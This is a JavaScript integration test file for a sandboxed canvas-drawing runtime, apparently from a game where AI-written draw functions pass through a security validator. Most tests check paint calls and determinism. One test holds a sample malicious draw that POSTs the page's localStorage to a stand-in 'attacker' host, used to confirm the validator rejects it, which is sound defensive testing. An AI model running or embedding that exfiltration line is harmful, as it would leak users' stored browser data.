/**
 * Integration test: run the actual sandbox runtime against the
 * actual demo draws + a fake canvas, and confirm we get correct
 * paint output without errors.
 *
 * This is the closest we can get to "did the iframe actually
 * paint?" without spinning up a real browser. The runtime
 * source itself can't be loaded (it's an HTML doc string), but
 * the COMPILED DRAWS produced by the parent are the same
 * function strings the iframe would eval, so executing them
 * here exercises the security pipeline + the AI's draw API
 * end-to-end.
 */

import { describe, it, expect } from "vitest";
import { compileVisuals } from "./compile-draws";
import { DEMO_VISUALS } from "./demo-draws";
import { makeRandom } from "./seeded-prng";

/**
 * Build a canvas-2d-like recorder. Captures every method call
 * + property set so we can assert what the draw actually did.
 *
 * Lets us write tests like "the queen aura calls beginPath()
 * once and arc() once and fill() once" without booting a browser.
 *
 * Uses a plain object with explicit method definitions instead
 * of a Proxy because the AST validator's allowlist is exhaustive -
 * we know every method the draws can possibly call.
 */
function makeFakeCtx() {
  const calls = [];
  const ctx = {
    __calls__: calls,
  };
  // Methods that take args and may return a gradient-like.
  const methods = [
    "fillRect", "clearRect", "strokeRect",
    "beginPath", "closePath", "moveTo", "lineTo", "bezierCurveTo", "quadraticCurveTo",
    "arc", "arcTo", "ellipse", "rect", "roundRect",
    "fill", "stroke",
    "save", "restore",
    "translate", "rotate", "scale", "transform", "setTransform", "resetTransform",
  ];
  for (const m of methods) {
    ctx[m] = (...args) => calls.push({ method: m, args });
  }
  // Gradient factories return a gradient object.
  for (const factory of ["createRadialGradient", "createLinearGradient", "createConicGradient"]) {
    ctx[factory] = (...args) => {
      calls.push({ method: factory, args });
      return {
        addColorStop: (off, color) => calls.push({ method: "addColorStop", args: [off, color] }),
      };
    };
  }
  // State setters: track via explicit setters so we can detect
  // them without a Proxy.
  for (const prop of [
    "fillStyle", "strokeStyle", "lineWidth", "lineCap", "lineJoin",
    "miterLimit", "globalAlpha", "globalCompositeOperation",
    "shadowColor", "shadowBlur", "shadowOffsetX", "shadowOffsetY",
  ]) {
    let value;
    Object.defineProperty(ctx, prop, {
      get: () => value,
      set: (v) => { value = v; calls.push({ method: "set:" + prop, args: [v] }); },
      enumerable: true,
    });
  }
  return ctx;
}

/**
 * Eval a compiled draw source the SAME way the iframe runtime
 * does: `new Function("return (" + source + ")")()`.
 */
function evalDraw(source) {
  // eslint-disable-next-line no-new-func
  return new Function("return (" + source + ")")();
}

/**
 * Build a guard helper identical to the one the iframe runtime
 * provides to user draws.
 */
function makeGuardFnAndCtx(maxIters = 5000, maxMs = 40) {
  const ctx = { iter: 0, t0: 0 };
  return {
    ctx,
    fn(g) {
      g.iter++;
      if (g.iter > maxIters) throw new Error("loop-guard");
      // wall-clock check skipped in tests for determinism
    },
    reset() { ctx.iter = 0; },
  };
}

describe("runtime integration - the actual demo draws executed end-to-end", () => {
  const compiled = compileVisuals(DEMO_VISUALS);

  it("compileVisuals accepts the demo block with no errors", () => {
    expect(compiled.errors).toEqual([]);
    expect(compiled.ok).toBe(true);
    expect(Object.keys(compiled.compiled.slots).sort()).toEqual(["n.aura", "p.aura", "q.aura"]);
    expect(Object.keys(compiled.compiled.projectiles)).toEqual(["fireball"]);
    expect(compiled.compiled.overlays.length).toBe(1);
  });

  it("queen aura draw executes and calls expected canvas methods", () => {
    const draw = evalDraw(compiled.compiled.slots["q.aura"]);
    const ctx = makeFakeCtx();
    const random = makeRandom("test");
    const { ctx: gctx, fn: guardFn } = makeGuardFnAndCtx();
    expect(() => draw(gctx, guardFn, ctx, 0, 0, 1, { type: "q", color: "w" }, 1234, random, {})).not.toThrow();

    const calls = ctx.__calls__;
    const methodNames = calls.map((c) => c.method);
    expect(methodNames).toContain("createRadialGradient");
    expect(methodNames).toContain("addColorStop");
    expect(methodNames).toContain("set:fillStyle");
    expect(methodNames).toContain("beginPath");
    expect(methodNames).toContain("arc");
    expect(methodNames).toContain("fill");
  });

  it("knight aura draw produces stroke calls (rings, not fills)", () => {
    const draw = evalDraw(compiled.compiled.slots["n.aura"]);
    const ctx = makeFakeCtx();
    const random = makeRandom("test");
    const { ctx: gctx, fn: guardFn } = makeGuardFnAndCtx();
    expect(() => draw(gctx, guardFn, ctx, 0, 0, -1, { type: "n", color: "b" }, 5000, random, {})).not.toThrow();

    const methodNames = ctx.__calls__.map((c) => c.method);
    expect(methodNames).toContain("set:strokeStyle");
    expect(methodNames).toContain("beginPath");
    expect(methodNames).toContain("arc");
    expect(methodNames).toContain("stroke");
  });

  it("pawn aura draw uses time + position for wobble", () => {
    const draw = evalDraw(compiled.compiled.slots["p.aura"]);
    const ctx = makeFakeCtx();
    const random = makeRandom("test");
    const { ctx: gctx, fn: guardFn } = makeGuardFnAndCtx();
    expect(() => draw(gctx, guardFn, ctx, 100, 200, 1, { type: "p", color: "w" }, 0, random, {})).not.toThrow();

    const arcCalls = ctx.__calls__.filter((c) => c.method === "arc");
    expect(arcCalls.length).toBeGreaterThan(0);
  });

  it("fireball projectile draw runs through 6 trail iterations under the guard", () => {
    const draw = evalDraw(compiled.compiled.projectiles.fireball);
    const ctx = makeFakeCtx();
    const { ctx: gctx, fn: guardFn } = makeGuardFnAndCtx();
    const p = {
      x: 100, y: 100,
      fromX: 50, fromY: 50,
      toX: 150, toY: 150,
      progress: 0.5,
      age: 0, ttl: 1000,
    };
    expect(() => draw(gctx, guardFn, ctx, p)).not.toThrow();

    const arcCalls = ctx.__calls__.filter((c) => c.method === "arc");
    expect(arcCalls.length).toBe(6);
    // The guard was called 6 times (once per loop iteration).
    expect(gctx.iter).toBe(6);
  });

  it("overlay draw paints a vignette gradient + fillRect", () => {
    const draw = evalDraw(compiled.compiled.overlays[0]);
    const ctx = makeFakeCtx();
    const { ctx: gctx, fn: guardFn } = makeGuardFnAndCtx();
    expect(() => draw(gctx, guardFn, ctx, { width: 480, height: 480, marks: {}, lastCast: null, t: 0 })).not.toThrow();

    const methodNames = ctx.__calls__.map((c) => c.method);
    expect(methodNames).toContain("createRadialGradient");
    expect(methodNames).toContain("set:fillStyle");
    expect(methodNames).toContain("fillRect");
  });

  it("all demo draws produce deterministic output for the same seed", () => {
    // Run the queen aura twice with the same time + seed; the
    // sequence of calls must be byte-identical.
    //
    // Comparison strategy: the gradient objects returned by
    // createRadialGradient are NEW instances per call (different
    // memory references), so we can't compare them directly with
    // toEqual. Map them to stable tokens before comparing.
    const draw = evalDraw(compiled.compiled.slots["q.aura"]);

    function normalize(calls) {
      return calls.map((c) => ({
        method: c.method,
        args: c.args.map((a) => (a && typeof a === "object" && typeof a.addColorStop === "function" ? "<gradient>" : a)),
      }));
    }

    const ctxA = makeFakeCtx();
    const randA = makeRandom("match-XYZ");
    const ga = makeGuardFnAndCtx();
    draw(ga.ctx, ga.fn, ctxA, 0, 0, 1, { type: "q", color: "w" }, 9999, randA, {});

    const ctxB = makeFakeCtx();
    const randB = makeRandom("match-XYZ");
    const gb = makeGuardFnAndCtx();
    draw(gb.ctx, gb.fn, ctxB, 0, 0, 1, { type: "q", color: "w" }, 9999, randB, {});

    expect(normalize(ctxA.__calls__)).toEqual(normalize(ctxB.__calls__));
  });

  it("a malicious draw is rejected by compileVisuals BEFORE it can reach the runtime", () => {
    const bad = {
      slots: {
        "q.aura": `
          // Try to read parent's localStorage. Should be rejected
          // at validate time, before injectLoopGuard.
          fetch("//attacker", { method: "POST", body: localStorage });
        `,
      },
    };
    const r = compileVisuals(bad);
    expect(r.ok).toBe(false);
    expect(Object.keys(r.compiled.slots)).toEqual([]); // bad draw dropped
    expect(r.errors[0].kind).toBe("slot");
    expect(r.errors[0].reason).toMatch(/fetch/);
  });
});
